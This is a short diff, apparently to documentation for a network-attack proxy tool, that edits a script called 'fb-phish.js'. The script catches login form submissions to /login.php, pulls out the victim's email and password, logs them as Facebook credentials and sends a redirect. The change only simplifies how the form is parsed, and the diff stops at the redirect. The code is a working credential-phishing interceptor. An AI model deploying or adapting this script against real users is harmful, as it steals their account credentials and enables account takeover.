@@ -174,20 +174,10 @@ The `caplets/fb-phish.js` proxy script file:
 ```javascript
 function onRequest(req, res) {
     if( req.Method == "POST" && req.Path == "/login.php" && req.ContentType == "application/x-www-form-urlencoded" ) {
-        var body = req.ReadBody();
-        var parts = body.split('&');
-        var email = "?", pass = "?";
+        var form = req.ParseForm();
+        var email = form["email"] || "?", 
+            pass  = form["pass"] || "?";
 
-        for( var i = 0; i < parts.length; i++ ) {
-            var nv = parts[i].split('=');
-            if( nv[0] == "email" ) {
-                email = nv[1];
-            } 
-            else if( nv[0] == "pass" ) {
-                pass = nv[1];
-            }
-        }
-    
         log( R(req.Client), " > FACEBOOK > email:", B(email), " pass:'" + B(pass) + "'" );
 
         res.Status      = 301;
